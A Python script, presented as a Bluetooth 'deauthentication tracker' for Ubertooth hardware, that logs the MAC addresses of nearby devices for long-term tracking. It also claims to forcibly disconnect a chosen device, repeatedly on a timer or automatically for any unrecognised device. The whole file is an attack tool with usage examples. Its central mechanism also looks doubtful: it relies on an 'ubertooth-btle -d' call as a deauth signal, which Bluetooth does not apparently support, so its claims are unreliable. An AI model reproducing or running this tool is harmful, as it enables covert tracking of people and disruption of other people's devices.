import argparse
import subprocess
import time
import json
import os

"""
Ubertooth Bluetooth Deauthentication Tracker

Features:
    - Monitors nearby Bluetooth (BLE & Classic) devices and logs their activity.
    - Tracks persistent or suspicious Bluetooth connections over time.
    - Selectively deauthenticates devices based on rules (e.g., unknown or blacklisted devices).
    - Can forcefully disconnect specific Bluetooth devices at scheduled intervals.
    - Logs detected devices and deauthentication events for analysis.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Track all Bluetooth (BLE & Classic) devices over time:
      python ubertooth_deauth_tracker.py --track --log tracked_devices.json
    - Deauthenticate a specific target MAC address:
      python ubertooth_deauth_tracker.py --deauth --target AA:BB:CC:DD:EE:FF
    - Schedule automatic deauthentication every 30 seconds:
      python ubertooth_deauth_tracker.py --deauth --target AA:BB:CC:DD:EE:FF --interval 30
    - Automatically track & deauthenticate unknown devices:
      python ubertooth_deauth_tracker.py --track --deauth-unknown --log tracked_devices.json
"""

TRACKED_DEVICES_FILE = "tracked_devices.json"

def load_tracked_devices():
    """Loads previously tracked Bluetooth devices from a file."""
    if os.path.exists(TRACKED_DEVICES_FILE):
        with open(TRACKED_DEVICES_FILE, "r") as f:
            return json.load(f)
    return {}

def save_tracked_device(mac_address, device_type):
    """Stores detected Bluetooth devices for future tracking."""
    tracked_devices = load_tracked_devices()
    if mac_address not in tracked_devices:
        tracked_devices[mac_address] = {"device_type": device_type, "last_seen": time.time()}
    
    with open(TRACKED_DEVICES_FILE, "w") as f:
        json.dump(tracked_devices, f, indent=4)

def scan_bluetooth_devices(log_file):
    """Scans for nearby Bluetooth (BLE & Classic) devices and logs their activity."""
    print("[INFO] Scanning for Bluetooth devices...")
    try:
        output = subprocess.check_output(["ubertooth-btle", "-s"])
        devices = output.decode("utf-8").split("\n")
        detected_devices = {}

        for line in devices:
            if "Device" in line:
                parts = line.split()
                if len(parts) > 2:
                    mac_address = parts[1]
                    device_type = "BLE" if "BLE" in line else "Classic"
                    detected_devices[mac_address] = device_type
                    print(f"[DETECTED] {device_type} Device: {mac_address}")

                    # Save device to tracking log
                    save_tracked_device(mac_address, device_type)

        if log_file:
            with open(log_file, "w") as f:
                json.dump(detected_devices, f, indent=4)
            print(f"[SUCCESS] Tracked Bluetooth devices saved to {log_file}")

    except Exception as e:
        print(f"[ERROR] Failed to scan for Bluetooth devices: {e}")

def deauthenticate_device(target_mac):
    """Deauthenticates a specific Bluetooth device."""
    print(f"[INFO] Sending deauthentication signal to {target_mac}...")
    try:
        subprocess.run(["ubertooth-btle", "-d", target_mac])
        print(f"[SUCCESS] Deauthentication signal sent to {target_mac}.")
    except Exception as e:
        print(f"[ERROR] Failed to deauthenticate {target_mac}: {e}")

def auto_deauth_unknown(log_file):
    """Automatically deauthenticates unknown Bluetooth devices."""
    print("[INFO] Scanning and deauthenticating unknown devices...")
    known_devices = load_tracked_devices()

    try:
        output = subprocess.check_output(["ubertooth-btle", "-s"])
        devices = output.decode("utf-8").split("\n")

        for line in devices:
            if "Device" in line:
                parts = line.split()
                if len(parts) > 2:
                    mac_address = parts[1]
                    if mac_address not in known_devices:
                        print(f"[ALERT] Unknown device detected: {mac_address}. Deauthenticating...")
                        deauthenticate_device(mac_address)
                    else:
                        print(f"[INFO] Known device detected: {mac_address}. No action taken.")

    except Exception as e:
        print(f"[ERROR] Failed to scan for unknown devices: {e}")

def scheduled_deauth(target_mac, interval):
    """Continuously deauthenticates a target device at specified intervals."""
    print(f"[INFO] Scheduled deauthentication of {target_mac} every {interval} seconds...")

    try:
        while True:
            deauthenticate_device(target_mac)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("[INFO] Stopping scheduled deauthentication.")
    except Exception as e:
        print(f"[ERROR] Scheduled deauthentication failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Deauthentication Tracker")
    parser.add_argument("--track", action="store_true", help="Track nearby Bluetooth (BLE & Classic) devices over time")
    parser.add_argument("--log", type=str, help="Log file to save detected devices")
    parser.add_argument("--deauth", action="store_true", help="Deauthenticate a specific Bluetooth device")
    parser.add_argument("--target", type=str, help="MAC address of the Bluetooth device to deauthenticate")
    parser.add_argument("--interval", type=int, default=0, help="Time interval for scheduled deauthentication")
    parser.add_argument("--deauth-unknown", action="store_true", help="Automatically deauthenticate unknown devices")

    args = parser.parse_args()

    if args.track and args.log:
        scan_bluetooth_devices(args.log)
    elif args.deauth and args.target:
        if args.interval > 0:
            scheduled_deauth(args.target, args.interval)
        else:
            deauthenticate_device(args.target)
    elif args.deauth_unknown and args.log:
        auto_deauth_unknown(args.log)
    else:
        print("[ERROR] No valid mode selected! Use --track with --log, --deauth with --target, or --deauth-unknown with --log.")
